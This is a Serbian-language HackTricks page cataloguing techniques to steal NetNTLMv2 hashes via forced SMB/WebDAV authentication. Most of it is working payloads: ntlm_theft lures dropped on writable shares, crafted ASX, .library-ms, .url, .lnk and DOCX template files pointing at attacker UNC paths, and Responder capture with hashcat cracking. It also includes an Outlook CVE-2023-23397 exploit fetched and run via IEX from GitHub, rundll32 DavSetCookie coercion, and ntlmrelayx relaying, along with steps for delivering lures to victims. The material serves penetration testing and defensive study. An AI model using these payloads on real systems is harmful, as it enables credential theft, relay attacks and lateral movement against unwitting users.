# Mesta za krađu NTLM credsa

{{#include ../../banners/hacktricks-training.md}}

**Pogledajte sve sjajne ideje na [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — od preuzimanja microsoft word fajla online do izvora ntlm leakova: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md i [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Ako možete da **pišete u share koji korisnici ili scheduled jobs pregledaju u Exploreru**, ubacite fajlove čiji metadata upućuje na vaš UNC (npr. `\\ATTACKER\share`). Prikazivanje foldera pokreće **implicitnu SMB autentikaciju** i šalje **NetNTLMv2** vašem listeneru.<sup>[[1]](#references)</sup>

1. **Generišite lures** (obuhvata SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/itd.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Ostavite ih na deljenom resursu sa dozvolom upisivanja** (bilo koja fascikla koju žrtva otvori):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Slušaj i crackuj**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows može pristupiti većem broju datoteka odjednom; za sve što Explorer pregleda (`BROWSE TO FOLDER`) nisu potrebni klikovi.

### Windows Media Player plejliste (.ASX/.WAX)

Ako navedete metu da otvori ili pregleda Windows Media Player plejlistu koju kontrolišete, možete leak-ovati Net‑NTLMv2 tako što ćete unos usmeriti na UNC putanju. WMP će pokušati da preuzme navedeni medij preko SMB-a i implicitno će se autentifikovati.<sup>[[3]](#references)[[4]](#references)</sup>

Primer payload-a:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Tok prikupljanja i crackovanja:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer nesigurno obrađuje .library-ms fajlove kada se otvore direktno iz ZIP arhive. Ako definicija biblioteke pokazuje na udaljenu UNC putanju (npr. \\attacker\share), samo pregledanje/pokretanje .library-ms fajla unutar ZIP-a dovodi do toga da Explorer enumeriše UNC i pošalje NTLM autentikaciju napadaču. Ovo daje NetNTLMv2 koji se može crack-ovati offline ili potencijalno relay-ovati.<sup>[[2]](#references)</sup>

Minimalni .library-ms koji pokazuje na attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operativni koraci
- Kreirajte .library-ms datoteku sa XML-om iznad (podesite svoju IP adresu/hostname).
- Zipujte je (na Windows-u: Send to → Compressed (zipped) folder) i pošaljite ZIP targetu.
- Pokrenite listener za NTLM capture i sačekajte da žrtva otvori .library-ms iz ZIP-a.


### Outlook putanja do zvuka podsetnika u kalendaru (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Microsoft Outlook for Windows je obrađivao prošireno MAPI svojstvo PidLidReminderFileParameter u stavkama kalendara. Ako je to svojstvo upućivalo na UNC putanju (npr. \\attacker\share\alert.wav), Outlook bi kontaktirao SMB share kada se podsetnik aktivira, čime bi Net-NTLMv2 korisnika bio leak-ovan bez ikakvog klika. Ovo je zakrpljeno 14. marta 2023, ali je i dalje veoma relevantno za legacy/neizmenjene flote i istorijski incident response.<sup>[[5]](#references)</sup>

Brza exploitation procedura pomoću PowerShell-a (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Strana listenera:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Napomene
- Žrtva samo treba da ima pokrenut Outlook for Windows kada se aktivira podsetnik.
- leak daje Net‑NTLMv2 pogodan za offline cracking ili relay (ne za pass-the-hash).


### .LNK/.URL icon-based zero-click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer automatski prikazuje ikone prečica. Nedavna istraživanja su pokazala da je, čak i nakon Microsoft zakrpe iz aprila 2025. za UNC-icon prečice, i dalje bilo moguće pokrenuti NTLM authentication bez klikova tako što se target prečice hostuje na UNC path-u, a ikona zadrži lokalno (patch bypass je dobio oznaku CVE‑2025‑50154). Samo pregledanje foldera navodi Explorer da preuzme metadata sa remote targeta, čime se NTLM šalje attacker SMB serveru.<sup>[[6]](#references)</sup>

Minimalni Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload programske prečice (.lnk) putem PowerShell-a:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Ideje za isporuku
- Ubacite prečicu u ZIP i navedite žrtvu da ga otvori.
- Postavite prečicu na share sa dozvolom za upis koji će žrtva otvoriti.
- Kombinujte je sa drugim lure fajlovima u istoj fascikli kako bi Explorer prikazao pregled stavki.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows učitava `.lnk` metadata tokom **pregleda/prikaza** (renderovanja ikone), a ne samo prilikom izvršavanja. CVE‑2026‑25185 prikazuje putanju parsiranja u kojoj **ExtraData** blokovi navode shell da razreši putanju ikone i pristupi filesystemu **tokom učitavanja**, pri čemu se emituje odlazni NTLM ako je putanja udaljena.

Ključni uslovi za aktiviranje (uočeni u `CShellLink::_LoadFromStream`):
- Uključite **DARWIN_PROPS** (`0xa0000006`) u ExtraData (uslov za rutinu ažuriranja ikone).
- Uključite **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) sa popunjenim poljem **TargetUnicode**.
- Loader proširuje environment variables u `TargetUnicode` i poziva `PathFileExistsW` nad rezultujućom putanjom.

Ako se `TargetUnicode` razreši u UNC putanju (npr. `\\attacker\share\icon.ico`), **samo pregledanje fascikle** koja sadrži prečicu izaziva odlaznu autentikaciju. Ista putanja učitavanja može se aktivirati i prilikom **indeksiranja** i **AV skeniranja**, što predstavlja praktičnu no-click leak površinu.<sup>[[7]](#references)</sup>

Research tooling (parser/generator/UI) dostupan je u projektu **LnkMeMaybe** za izgradnju/proveru ovih struktura bez korišćenja Windows GUI-ja.<sup>[[8]](#references)</sup>


### WebDAV auth coercion / credential validation via davclnt.dll,DavSetCookie

Izvorni **WebDAV client** može se zloupotrebiti za prisiljavanje trenutne logon sesije da se autentifikuje na proizvoljnom **HTTP/WebDAV** endpointu:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Zašto je ovo korisno:
- Protiv **WebDAV servera pod kontrolom napadača**, može pokrenuti **NTLM preko HTTP-a** bez postavljanja prilagođenog klijenta.
- Protiv **internih hostova**, ovo je tih način da se proveri gde se prihvataju **ukradeni kredencijali** pre lateralnog kretanja.<sup>[[9]](#references)</sup>
- Komanda je dobra alternativa kada je **SMB egress** filtriran, ali su **HTTP/WebDAV** i dalje dostupni.

Operativne napomene:
- Servis **WebClient** mora biti pokrenut na izvornom hostu.
- `rundll32.exe` učitava `davclnt.dll` i omogućava Windows-u da obavi WebDAV autentifikaciju koristeći **kredencijale trenutno prijavljenog korisnika**.<sup>[[10]](#references)</sup>
- Ako ga usmeravate ka infrastrukturi koju kontrolišete, koristite NTLM-aware HTTP listener/relay kao što je:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
Iz perspektive detekcije, ponovljena izvršavanja `rundll32.exe davclnt.dll,DavSetCookie` prema velikom broju internih sistema predstavljaju snažan signal **provere kredencijala / pripreme za lateralno kretanje nalik spray napadu**, a ne uobičajeno ponašanje korisnika.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) za prisilu NTLM-a

Office dokumenti mogu da referenciraju eksterni template. Ako priloženi template podesite na UNC putanju, otvaranje dokumenta će izvršiti autentikaciju prema SMB-u.

Minimalne DOCX izmene relacija (unutar word/):

1) Izmenite word/settings.xml i dodajte referencu na priloženi template:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Izmenite word/_rels/settings.xml.rels i usmerite rId1337 na svoj UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Ponovo zapakujte u .docx i isporučite. Pokrenite svoj SMB capture listener i sačekajte otvaranje.

Za post-capture ideje o relaying-u ili abusing-u NTLM-a, pogledajte:

{{#ref}}
README.md
{{#endref}}


## Reference
- [1] [HTB: Breach – Mame sa writable share-om + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 do DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS junction do webroot RCE → FullPowers + GodPotato do SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM ranjivosti: nezakrpljene pretnje eskalacije privilegija u Microsoftu](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft ublažava Outlook EoP (CVE‑2023‑23397) i objašnjava NTLM leak putem PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero-click, one NTLM: zaobilaženje Microsoft security patch-a (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: pregled CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Kada IT podrška pozove: analiza ModeloRAT campaign-a od Teams-a do kompromitacije domena](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – zaglavlje davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
